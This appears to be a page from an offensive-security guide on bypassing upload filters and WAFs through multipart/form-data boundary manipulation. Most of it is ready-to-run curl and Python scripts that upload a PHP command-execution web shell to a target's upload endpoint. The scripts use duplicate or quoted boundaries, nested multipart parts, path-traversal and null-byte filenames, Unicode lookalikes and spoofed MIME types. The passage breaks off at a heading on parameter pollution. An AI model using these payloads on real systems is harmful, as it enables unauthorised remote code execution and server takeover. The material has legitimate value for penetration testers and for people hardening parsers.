---
title: Multi-Part Boundary Manipulation
description: Exploit file upload endpoints by manipulating multipart/form-data boundaries, headers, field ordering, and parsing differentials to bypass security filters, WAFs, and server-side validation for remote code execution.
navigation:
  icon: i-lucide-split
  title: Boundary Manipulation
---

## Overview

::note
Multipart/form-data is the standard encoding for file uploads over HTTP. The boundary string separates each part of the request body. Manipulating boundaries, Content-Disposition headers, field names, filename parameters, and Content-Type declarations exploits parsing inconsistencies between WAFs, proxies, and backend application servers to bypass upload restrictions.
::

::card-group
  ::card
  ---
  title: Boundary Confusion
  icon: i-lucide-git-branch
  ---
  Inject duplicate, nested, malformed, or conflicting boundary strings to confuse parsers into accepting malicious file content.
  ::

  ::card
  ---
  title: Header Injection
  icon: i-lucide-file-text
  ---
  Manipulate Content-Disposition, Content-Type, filename, and name parameters with encoding tricks, null bytes, and padding to bypass validation.
  ::

  ::card
  ---
  title: Parser Differential
  icon: i-lucide-shuffle
  ---
  Exploit differences in how WAFs, reverse proxies, and backend frameworks parse multipart requests to smuggle payloads past security layers.
  ::

  ::card
  ---
  title: Field Pollution
  icon: i-lucide-copy
  ---
  Submit duplicate parameters, overlapping fields, and conflicting metadata to trigger first-match vs last-match parsing discrepancies.
  ::
::

---

## Multipart Request Anatomy

::tip
Understanding the exact structure of multipart/form-data requests is critical. Every byte matters — boundary placement, CRLF sequences, header ordering, and whitespace handling all create exploitation opportunities.
::

::code-group
```text [Standard Multipart Structure]
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 328

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="image.jpg"
Content-Type: image/jpeg

<file binary data>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

```text [Anatomy Breakdown]
┌──────────────────────────────────────────────────────────────┐
│ Content-Type: multipart/form-data; boundary=BOUNDARY_STRING │
│                                                              │
│ Key rules:                                                   │
│ • Boundary in header: BOUNDARY_STRING                        │
│ • Boundary in body:   --BOUNDARY_STRING  (prefixed with --)  │
│ • Final boundary:     --BOUNDARY_STRING-- (suffixed with --) │
│ • Each part separated by CRLF (\r\n)                         │
│ • Headers and body separated by empty line (double CRLF)     │
│ • Boundary max length: 70 characters (RFC 2046)              │
│ • Boundary chars: A-Z a-z 0-9 '()+_,-./:=? and space        │
└──────────────────────────────────────────────────────────────┘

┌─ Request Header ─────────────────────────────────────────────┐
│ Content-Type: multipart/form-data; boundary=ABC123           │
├─ Body ───────────────────────────────────────────────────────┤
│ --ABC123\r\n                          ◄── Part delimiter     │
│ Content-Disposition: form-data; ──┐   ◄── Part headers       │
│   name="file";                    │                          │
│   filename="shell.php"            │                          │
│ Content-Type: image/jpeg     ─────┘                          │
│ \r\n                              ◄── Empty line (separator) │
│ <?php system($_GET["cmd"]); ?>    ◄── Part body (file data)  │
│ \r\n                                                         │
│ --ABC123--\r\n                    ◄── Final delimiter         │
└──────────────────────────────────────────────────────────────┘
```
::

---

## Reconnaissance & Request Capture

::tabs
  :::tabs-item{icon="i-lucide-search" label="Intercept & Analyze"}
  ```bash [Terminal]
  # Capture legitimate upload request with curl verbose
  curl -v -F "file=@clean.jpg" https://target.com/upload 2>&1 | tee upload_capture.txt

  # Capture with specific boundary
  curl -v -H "Content-Type: multipart/form-data; boundary=TESTBOUNDARY" \
    --data-binary $'--TESTBOUNDARY\r\nContent-Disposition: form-data; name="file"; filename="test.jpg"\r\nContent-Type: image/jpeg\r\n\r\nFILEDATA\r\n--TESTBOUNDARY--\r\n' \
    https://target.com/upload

  # Capture raw request with netcat
  nc -lvp 8888 < /dev/null &
  curl -F "file=@clean.jpg" http://127.0.0.1:8888/upload

  # Capture with mitmproxy
  mitmproxy --mode upstream:https://target.com -p 8080 --set console_focus_follow=true

  # Using Burp Suite macro export
  # Intercept → Right-click → Copy as curl command

  # Analyze boundary used by browser
  curl -sD - -F "file=@clean.jpg" https://target.com/upload | head -30

  # Extract boundary from response headers
  curl -sI -F "file=@clean.jpg" https://target.com/upload | grep -i "boundary"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Server Behavior Fingerprinting"}
  ```bash [Terminal]
  # Test if server validates Content-Type header boundary match
  # Send mismatched boundary (header vs body)
  curl -v -H "Content-Type: multipart/form-data; boundary=HEADER_BOUNDARY" \
    --data-binary $'--BODY_BOUNDARY\r\nContent-Disposition: form-data; name="file"; filename="test.jpg"\r\nContent-Type: image/jpeg\r\n\r\nTEST\r\n--BODY_BOUNDARY--\r\n' \
    https://target.com/upload

  # Test boundary with special characters
  for char in "'" '"' ' ' ';' '=' '(' ')' '@' ',' '/' '?' '<' '>'; do
    echo "Testing boundary with: $char"
    BOUND="test${char}boundary"
    curl -s -o /dev/null -w "%{http_code}" \
      -H "Content-Type: multipart/form-data; boundary=${BOUND}" \
      --data-binary $"--${BOUND}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nTEST\r\n--${BOUND}--\r\n" \
      https://target.com/upload
    echo ""
  done

  # Test various Content-Type capitalizations
  for ct in "Multipart/Form-Data" "MULTIPART/FORM-DATA" "multipart/Form-data" "multipart/form-DATA"; do
    echo "Testing: $ct"
    curl -s -o /dev/null -w "%{http_code}" \
      -H "Content-Type: ${ct}; boundary=test123" \
      --data-binary $'--test123\r\nContent-Disposition: form-data; name="file"; filename="test.jpg"\r\n\r\nTEST\r\n--test123--\r\n' \
      https://target.com/upload
    echo ""
  done

  # Test line ending handling (CRLF vs LF vs CR)
  # CRLF (standard)
  printf -- '--BOUND\r\nContent-Disposition: form-data; name="file"; filename="test.jpg"\r\n\r\nTEST\r\n--BOUND--\r\n' | \
    curl -s -o /dev/null -w "CRLF: %{http_code}\n" -H "Content-Type: multipart/form-data; boundary=BOUND" --data-binary @- https://target.com/upload

  # LF only
  printf -- '--BOUND\nContent-Disposition: form-data; name="file"; filename="test.jpg"\n\nTEST\n--BOUND--\n' | \
    curl -s -o /dev/null -w "LF: %{http_code}\n" -H "Content-Type: multipart/form-data; boundary=BOUND" --data-binary @- https://target.com/upload
  ```
  :::

  :::tabs-item{icon="i-lucide-flask-conical" label="Parser Detection"}
  ```bash [Terminal]
  # Identify backend framework parser via error responses
  # Send malformed multipart to trigger parser-specific errors

  # Empty boundary
  curl -v -H "Content-Type: multipart/form-data; boundary=" \
    --data-binary $'----\r\nContent-Disposition: form-data; name="file"\r\n\r\ntest\r\n------\r\n' \
    https://target.com/upload 2>&1 | grep -iE "error|exception|stack|trace|framework"

  # Missing boundary parameter
  curl -v -H "Content-Type: multipart/form-data" \
    -d "test" https://target.com/upload 2>&1 | grep -iE "error|exception|boundary"

  # Invalid multipart structure
  curl -v -H "Content-Type: multipart/form-data; boundary=X" \
    -d "GARBAGE" https://target.com/upload 2>&1 | grep -iE "error|exception|parse|multer|busboy|formidable|werkzeug|spring|django|rack|kestrel"

  # Oversized boundary (>70 chars per RFC)
  LONG_BOUND=$(python3 -c "print('A'*500)")
  curl -v -H "Content-Type: multipart/form-data; boundary=${LONG_BOUND}" \
    --data-binary "--${LONG_BOUND}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"t.jpg\"\r\n\r\nT\r\n--${LONG_BOUND}--\r\n" \
    https://target.com/upload 2>&1

  # Framework detection via response headers/body patterns
  curl -sD - https://target.com/upload -X POST | grep -iE "x-powered|server|x-aspnet|x-request-id|cf-ray"
  ```
  :::
::

---

## Boundary String Manipulation

::warning
Different parsers handle boundary strings differently. By manipulating the boundary declaration, you can cause WAFs to see different request parts than the backend server, effectively smuggling malicious files past security controls.
::

::accordion
  :::accordion-item{icon="i-lucide-git-branch" label="Duplicate Boundary Declaration"}
  ```bash [Terminal]
  # Two boundary parameters — WAF may use first, backend may use second
  curl -v \
    -H 'Content-Type: multipart/form-data; boundary=SAFE; boundary=EVIL' \
    --data-binary $'--EVIL\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--EVIL--\r\n' \
    https://target.com/upload

  # Reversed order
  curl -v \
    -H 'Content-Type: multipart/form-data; boundary=EVIL; boundary=SAFE' \
    --data-binary $'--EVIL\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--EVIL--\r\n' \
    https://target.com/upload

  # Boundary with different separators
  curl -v \
    -H 'Content-Type: multipart/form-data; boundary=SAFE, boundary=EVIL' \
    --data-binary $'--EVIL\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--EVIL--\r\n' \
    https://target.com/upload

  # Boundary in separate Content-Type headers
  curl -v \
    -H 'Content-Type: multipart/form-data; boundary=SAFE' \
    -H 'Content-Type: multipart/form-data; boundary=EVIL' \
    --data-binary $'--EVIL\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--EVIL--\r\n' \
    https://target.com/upload
  ```
  :::

  :::accordion-item{icon="i-lucide-space" label="Boundary with Whitespace & Padding"}
  ```bash [Terminal]
  # Leading whitespace in boundary
  curl -v \
    -H 'Content-Type: multipart/form-data; boundary= BOUND' \
    --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
    https://target.com/upload

  # Trailing whitespace in boundary
  curl -v \
    -H 'Content-Type: multipart/form-data; boundary=BOUND ' \
    --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
    https://target.com/upload

  # Tab characters in boundary
  curl -v \
    -H $'Content-Type: multipart/form-data; boundary=\tBOUND' \
    --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
    https://target.com/upload

  # Boundary with spaces in value
  curl -v \
    -H 'Content-Type: multipart/form-data; boundary="BOUND ARY"' \
    --data-binary $'--BOUND ARY\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND ARY--\r\n' \
    https://target.com/upload

  # Whitespace before/after boundary= parameter
  curl -v \
    -H 'Content-Type: multipart/form-data;  boundary=BOUND' \
    --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
    https://target.com/upload

  # No space after semicolon
  curl -v \
    -H 'Content-Type: multipart/form-data;boundary=BOUND' \
    --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
    https://target.com/upload

  # Multiple spaces
  curl -v \
    -H 'Content-Type: multipart/form-data;     boundary=BOUND' \
    --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
    https://target.com/upload
  ```
  :::

  :::accordion-item{icon="i-lucide-quote" label="Boundary Quoting Variations"}
  ```bash [Terminal]
  # Quoted boundary
  curl -v \
    -H 'Content-Type: multipart/form-data; boundary="BOUND"' \
    --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
    https://target.com/upload

  # Single-quoted boundary (non-standard)
  curl -v \
    -H "Content-Type: multipart/form-data; boundary='BOUND'" \
    --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
    https://target.com/upload

  # Quoted with internal quotes
  curl -v \
    -H 'Content-Type: multipart/form-data; boundary="BO\"UND"' \
    --data-binary $'--BO"UND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BO"UND--\r\n' \
    https://target.com/upload

  # Boundary includes quotes literally — WAF vs backend sees different boundary
  curl -v \
    -H 'Content-Type: multipart/form-data; boundary="BOUND"' \
    --data-binary $'--"BOUND"\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--"BOUND"--\r\n' \
    https://target.com/upload

  # Partial quoting
  curl -v \
    -H 'Content-Type: multipart/form-data; boundary="BOUND' \
    --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
    https://target.com/upload
  ```
  :::

  :::accordion-item{icon="i-lucide-hash" label="Boundary Special Characters"}
  ```bash [Terminal]
  # Boundary with dashes (common in browser-generated boundaries)
  curl -v \
    -H 'Content-Type: multipart/form-data; boundary=----FormBoundary' \
    --data-binary $'------FormBoundary\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------FormBoundary--\r\n' \
    https://target.com/upload

  # Boundary that resembles body content
  curl -v \
    -H 'Content-Type: multipart/form-data; boundary=Content-Disposition: form-data' \
    --data-binary $'--Content-Disposition: form-data\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--Content-Disposition: form-data--\r\n' \
    https://target.com/upload

  # Empty-ish boundary
  curl -v \
    -H 'Content-Type: multipart/form-data; boundary=x' \
    --data-binary $'--x\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--x--\r\n' \
    https://target.com/upload

  # Very long boundary
  python3 -c "
  import requests
  bound = 'A' * 200
  body = f'--{bound}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n<?php system(\$_GET[\"cmd\"]); ?>\r\n--{bound}--\r\n'
  r = requests.post('https://target.com/upload',
    headers={'Content-Type': f'multipart/form-data; boundary={bound}'},
    data=body.encode())
  print(r.status_code, r.text[:200])
  "

  # Boundary containing CRLF (potential header injection)
  python3 -c "
  import requests
  body = b'--BOUND\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n<?php system(\$_GET[\"cmd\"]); ?>\r\n--BOUND--\r\n'
  r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND\r\nX-Injected: true'},
    data=body)
  print(r.status_code)
  "
  ```
  :::

  :::accordion-item{icon="i-lucide-layers" label="Nested / Embedded Boundaries"}
  ```bash [Terminal]
  # Nested multipart (multipart within multipart)
  python3 << 'PYEOF'
  import requests

  inner_boundary = "INNER_BOUND"
  outer_boundary = "OUTER_BOUND"

  inner_part = (
      f"--{inner_boundary}\r\n"
      f'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
      f"Content-Type: application/x-php\r\n"
      f"\r\n"
      f'<?php system($_GET["cmd"]); ?>\r\n'
      f"--{inner_boundary}--\r\n"
  )

  body = (
      f"--{outer_boundary}\r\n"
      f'Content-Disposition: form-data; name="upload"\r\n'
      f"Content-Type: multipart/mixed; boundary={inner_boundary}\r\n"
      f"\r\n"
      f"{inner_part}"
      f"--{outer_boundary}--\r\n"
  )

  r = requests.post(
      "https://target.com/upload",
      headers={"Content-Type": f"multipart/form-data; boundary={outer_boundary}"},
      data=body.encode()
  )
  print(f"Status: {r.status_code}")
  print(r.text[:500])
  PYEOF

  # Triple-nested boundary
  python3 << 'PYEOF'
  import requests

  b1, b2, b3 = "LEVEL1", "LEVEL2", "LEVEL3"

  level3 = (
      f"--{b3}\r\n"
      f'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n'
      f'<?php system($_GET["cmd"]); ?>\r\n'
      f"--{b3}--\r\n"
  )

  level2 = (
      f"--{b2}\r\n"
      f"Content-Type: multipart/mixed; boundary={b3}\r\n\r\n"
      f"{level3}"
      f"--{b2}--\r\n"
  )

  level1 = (
      f"--{b1}\r\n"
      f"Content-Type: multipart/mixed; boundary={b2}\r\n\r\n"
      f"{level2}"
      f"--{b1}--\r\n"
  )

  r = requests.post(
      "https://target.com/upload",
      headers={"Content-Type": f"multipart/form-data; boundary={b1}"},
      data=level1.encode()
  )
  print(f"Status: {r.status_code}")
  PYEOF
  ```
  :::
::

---

## Content-Disposition Manipulation

::caution
The `Content-Disposition` header within each multipart part defines the field name and filename. Parsers handle edge cases differently — duplicate parameters, encoding tricks, and formatting quirks create bypass opportunities.
::

::tabs
  :::tabs-item{icon="i-lucide-file" label="Filename Parameter Tricks"}
  ```bash [Terminal]
  # Standard filename
  # Content-Disposition: form-data; name="file"; filename="shell.php"

  # Swapped parameter order
  python3 -c "
  import requests
  body = (
    '--BOUND\r\n'
    'Content-Disposition: form-data; filename=\"shell.php\"; name=\"file\"\r\n'
    '\r\n'
    '<?php system(\$_GET[\"cmd\"]); ?>\r\n'
    '--BOUND--\r\n'
  )
  r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
    data=body.encode())
  print(r.status_code, r.text[:200])
  "

  # Duplicate filename (first vs last wins)
  python3 -c "
  import requests
  body = (
    '--BOUND\r\n'
    'Content-Disposition: form-data; name=\"file\"; filename=\"safe.jpg\"; filename=\"shell.php\"\r\n'
    '\r\n'
    '<?php system(\$_GET[\"cmd\"]); ?>\r\n'
    '--BOUND--\r\n'
  )
  r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
    data=body.encode())
  print(r.status_code, r.text[:200])
  "

  # Filename with path separators
  for fn in 'shell.php' '../shell.php' '..\\shell.php' '/var/www/html/shell.php' \
    '....//shell.php' '..%2fshell.php' '%2e%2e/shell.php' '..%5cshell.php' \
    'folder/../../../shell.php'; do
    echo "Testing filename: $fn"
    curl -s -o /dev/null -w "%{http_code}" \
      -H "Content-Type: multipart/form-data; boundary=BOUND" \
      --data-binary "$(printf -- '--BOUND\r\nContent-Disposition: form-data; name="file"; filename="%s"\r\n\r\nSHELL\r\n--BOUND--\r\n' "$fn")" \
      https://target.com/upload
    echo ""
  done

  # Filename with null byte
  python3 -c "
  import requests
  body = (
    b'--BOUND\r\n'
    b'Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\x00.jpg\"\r\n'
    b'\r\n'
    b'<?php system(\$_GET[\"cmd\"]); ?>\r\n'
    b'--BOUND--\r\n'
  )
  r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
    data=body)
  print(r.status_code, r.text[:200])
  "

  # Filename with semicolons
  python3 -c "
  import requests
  filenames = [
    'shell.php;.jpg',
    'shell.php;jpg',
    'shell.jpg;.php',
    ';shell.php',
  ]
  for fn in filenames:
    body = f'--BOUND\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{fn}\"\r\n\r\nSHELL\r\n--BOUND--\r\n'
    r = requests.post('https://target.com/upload',
      headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
      data=body.encode())
    print(f'{fn}: {r.status_code}')
  "
  ```
  :::

  :::tabs-item{icon="i-lucide-text-cursor-input" label="Filename Encoding Tricks"}
  ```bash [Terminal]
  # RFC 5987 encoded filename (filename*)
  python3 -c "
  import requests
  body = (
    '--BOUND\r\n'
    'Content-Disposition: form-data; name=\"file\"; filename=\"safe.jpg\"; filename*=UTF-8'\''shell.php\r\n'
    '\r\n'
    '<?php system(\$_GET[\"cmd\"]); ?>\r\n'
    '--BOUND--\r\n'
  )
  r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
    data=body.encode())
  print(r.status_code, r.text[:200])
  "

  # URL-encoded filename
  python3 -c "
  import requests
  filenames = [
    'shell%2Ephp',           # . encoded
    '%73%68%65%6C%6C.php',   # 'shell' encoded
    'shell.ph%70',           # 'p' encoded
    '%2e%2e/%73hell.php',    # path traversal encoded
    'shell.p%68p',           # 'h' encoded
  ]
  for fn in filenames:
    body = f'--BOUND\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{fn}\"\r\n\r\nSHELL\r\n--BOUND--\r\n'
    r = requests.post('https://target.com/upload',
      headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
      data=body.encode())
    print(f'{fn}: {r.status_code}')
  "

  # Double URL-encoded filename
  python3 -c "
  import requests
  filenames = [
    'shell%252Ephp',          # double-encoded dot
    'shell%252ephp',          # lowercase hex
    '%2573hell.php',          # double-encoded 's'
  ]
  for fn in filenames:
    body = f'--BOUND\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{fn}\"\r\n\r\nSHELL\r\n--BOUND--\r\n'
    r = requests.post('https://target.com/upload',
      headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
      data=body.encode())
    print(f'{fn}: {r.status_code}')
  "

  # Unicode filename normalization attacks
  python3 -c "
  import requests
  filenames = [
    'shell.php',
    'shell.ᵽhp',       # Latin small letter p with stroke
    'shell.pⱨp',       # Latin small letter h with descender
    'shеll.php',       # Cyrillic 'е' instead of Latin 'e'
    'ѕhell.php',       # Cyrillic 'ѕ' instead of Latin 's'
    'shell.ⲣhp',       # Coptic small letter rho
    'shell．php',       # Fullwidth full stop
    'shell。php',       # Ideographic full stop
    'shell\u2024php',   # One dot leader
    'shell\uFF0Ephp',   # Fullwidth full stop
  ]
  for fn in filenames:
    body = f'--BOUND\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{fn}\"\r\n\r\nSHELL\r\n--BOUND--\r\n'
    r = requests.post('https://target.com/upload',
      headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
      data=body.encode('utf-8'))
    print(f'{fn} ({fn.encode(\"unicode_escape\").decode()}): {r.status_code}')
  "

  # Backslash vs forward slash in filename
  python3 -c "
  import requests
  filenames = [
    'uploads\\\\shell.php',
    'uploads/shell.php',
    '..\\\\..\\\\shell.php',
    '..\\\\shell.php',
    '.\\\\shell.php',
  ]
  for fn in filenames:
    body = f'--BOUND\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{fn}\"\r\n\r\nSHELL\r\n--BOUND--\r\n'
    r = requests.post('https://target.com/upload',
      headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
      data=body.encode())
    print(f'{repr(fn)}: {r.status_code}')
  "
  ```
  :::

  :::tabs-item{icon="i-lucide-settings" label="Content-Disposition Header Variants"}
  ```bash [Terminal]
  # Case variations
  python3 << 'PYEOF'
  import requests

  dispositions = [
      'Content-Disposition: form-data; name="file"; filename="shell.php"',
      'content-disposition: form-data; name="file"; filename="shell.php"',
      'CONTENT-DISPOSITION: form-data; name="file"; filename="shell.php"',
      'Content-disposition: form-data; name="file"; filename="shell.php"',
      'content-Disposition: form-data; name="file"; filename="shell.php"',
      'CoNtEnT-DiSpOsItIoN: form-data; name="file"; filename="shell.php"',
  ]

  for disp in dispositions:
      body = f'--BOUND\r\n{disp}\r\n\r\nSHELL\r\n--BOUND--\r\n'
      r = requests.post('https://target.com/upload',
          headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
          data=body.encode())
      print(f'{disp[:50]}: {r.status_code}')
  PYEOF

  # Extra whitespace in header value
  python3 << 'PYEOF'
  import requests

  variations = [
      'form-data;name="file";filename="shell.php"',           # No spaces
      'form-data;  name="file";  filename="shell.php"',       # Extra spaces
      'form-data;\tname="file";\tfilename="shell.php"',       # Tabs
      'form-data ;name="file" ;filename="shell.php"',         # Space before semicolon
      'form-data ; name="file" ; filename="shell.php"',       # Spaces around semicolons
      ' form-data; name="file"; filename="shell.php"',        # Leading space
      'form-data; name="file"; filename="shell.php" ',        # Trailing space
  ]

  for var in variations:
      body = f'--BOUND\r\nContent-Disposition: {var}\r\n\r\nSHELL\r\n--BOUND--\r\n'
      r = requests.post('https://target.com/upload',
          headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
          data=body.encode())
      print(f'{var[:60]}: {r.status_code}')
  PYEOF

  # Multiline Content-Disposition (header folding / continuation)
  python3 -c "
  import requests
  body = (
    '--BOUND\r\n'
    'Content-Disposition: form-data;\r\n'
    ' name=\"file\";\r\n'
    ' filename=\"shell.php\"\r\n'
    '\r\n'
    '<?php system(\$_GET[\"cmd\"]); ?>\r\n'
    '--BOUND--\r\n'
  )
  r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
    data=body.encode())
  print(r.status_code, r.text[:200])
  "

  # Tab-based continuation
  python3 -c "
  import requests
  body = (
    '--BOUND\r\n'
    'Content-Disposition: form-data;\r\n'
    '\tname=\"file\";\r\n'
    '\tfilename=\"shell.php\"\r\n'
    '\r\n'
    '<?php system(\$_GET[\"cmd\"]); ?>\r\n'
    '--BOUND--\r\n'
  )
  r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
    data=body.encode())
  print(r.status_code, r.text[:200])
  "
  ```
  :::
::

---

## Content-Type Manipulation Per Part

::tabs
  :::tabs-item{icon="i-lucide-file-type" label="MIME Type Spoofing"}
  ```bash [Terminal]
  # Standard image MIME with PHP content
  python3 << 'PYEOF'
  import requests

  mime_types = [
      'image/jpeg',
      'image/png',
      'image/gif',
      'image/svg+xml',
      'image/webp',
      'image/bmp',
      'image/tiff',
      'application/octet-stream',
      'text/plain',
      'application/x-php',
      'text/x-php',
      'application/x-httpd-php',
      'image/jpeg\r\nX-Injected: true',  # Header injection attempt
      'image/jpeg; charset=utf-8',
      'image/jpeg, application/x-php',
      'IMAGE/JPEG',
      'Image/Jpeg',
      '',                                 # Empty Content-Type
  ]

  for mime in mime_types:
      ct_line = f'Content-Type: {mime}\r\n' if mime else ''
      body = (
          f'--BOUND\r\n'
          f'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
          f'{ct_line}'
          f'\r\n'
          f'<?php system($_GET["cmd"]); ?>\r\n'
          f'--BOUND--\r\n'
      )
      r = requests.post('https://target.com/upload',
          headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
          data=body.encode())
      print(f'{mime[:50] if mime else "(none)"}: {r.status_code}')
  PYEOF
  ```
  :::

  :::tabs-item{icon="i-lucide-copy" label="Duplicate Content-Type Headers"}
  ```bash [Terminal]
  # Multiple Content-Type headers per part
  python3 << 'PYEOF'
  import requests

  # First Content-Type seen by WAF, second by backend (or vice versa)
  combos = [
      ('image/jpeg', 'application/x-php'),
      ('application/x-php', 'image/jpeg'),
      ('image/png', 'text/x-php'),
      ('image/gif', 'application/x-httpd-php'),
      ('application/octet-stream', 'image/jpeg'),
  ]

  for ct1, ct2 in combos:
      body = (
          '--BOUND\r\n'
          f'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
          f'Content-Type: {ct1}\r\n'
          f'Content-Type: {ct2}\r\n'
          '\r\n'
          '<?php system($_GET["cmd"]); ?>\r\n'
          '--BOUND--\r\n'
      )
      r = requests.post('https://target.com/upload',
          headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
          data=body.encode())
      print(f'{ct1} + {ct2}: {r.status_code}')
  PYEOF

  # Content-Type with additional parameters
  python3 << 'PYEOF'
  import requests

  cts = [
      'image/jpeg; name=evil.php',
      'image/jpeg; charset=binary; x-ext=php',
      'multipart/form-data; boundary=INNER',
      'text/html; charset=utf-8',
      'application/x-www-form-urlencoded',
      'image/jpeg;boundary=fake',
  ]

  for ct in cts:
      body = (
          '--BOUND\r\n'
          f'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
          f'Content-Type: {ct}\r\n'
          '\r\n'
          '<?php system($_GET["cmd"]); ?>\r\n'
          '--BOUND--\r\n'
      )
      r = requests.post('https://target.com/upload',
          headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
          data=body.encode())
      print(f'{ct}: {r.status_code}')
  PYEOF
  ```
  :::

  :::tabs-item{icon="i-lucide-ban" label="Missing / Malformed Content-Type"}
  ```bash [Terminal]
  # No Content-Type in part header
  python3 -c "
  import requests
  body = (
    '--BOUND\r\n'
    'Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n'
    '\r\n'
    '<?php system(\$_GET[\"cmd\"]); ?>\r\n'
    '--BOUND--\r\n'
  )
  r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
    data=body.encode())
  print(f'No CT: {r.status_code}')
  "

  # Truncated Content-Type
  python3 -c "
  import requests
  cts = [
    'Content-Type:',
    'Content-Type: ',
    'Content-Type: image',
    'Content-Type: image/',
    'Content-Type: /',
  ]
  for ct in cts:
    body = f'--BOUND\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n{ct}\r\n\r\nSHELL\r\n--BOUND--\r\n'
    r = requests.post('https://target.com/upload',
      headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
      data=body.encode())
    print(f'{ct}: {r.status_code}')
  "

  # Content-Type with null bytes
  python3 -c "
  import requests
  body = (
    b'--BOUND\r\n'
    b'Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n'
    b'Content-Type: image/jpeg\x00application/x-php\r\n'
    b'\r\n'
    b'<?php system(\$_GET[\"cmd\"]); ?>\r\n'
    b'--BOUND--\r\n'
  )
  r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
    data=body)
  print(f'Null byte CT: {r.status_code}')
  "
  ```
  :::
::

---

## Duplicate Field & Parameter Pollution

::warning
